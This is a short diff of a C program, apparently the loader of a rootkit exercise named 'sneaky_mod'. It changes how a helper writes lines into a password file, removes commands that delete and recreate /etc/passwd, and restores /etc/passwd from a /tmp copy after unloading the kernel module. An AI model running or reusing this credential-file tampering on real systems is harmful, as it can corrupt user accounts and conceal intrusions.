@@ -4,7 +4,7 @@
 #include <unistd.h>
 
 void add_to_pw(const char *fileName, const char *line){
-    FILE *file = fopen(fileName, "a");
+    FILE *file = fopen(fileName, "w");
     if(!file){
         perror("Fail to open file for writing in pw\n");
         EXIT_FAILURE;
@@ -49,8 +49,7 @@ int main(){
     }
 
     system("rmmod sneaky_mod.ko");
-    system("rm /etc/passwd");
-    system("touch /etc/passwd");
+    
     copy_file("/tmp/passwd", "/etc/passwd");
     system("rm /tmp/passwd");
     return EXIT_SUCCESS;
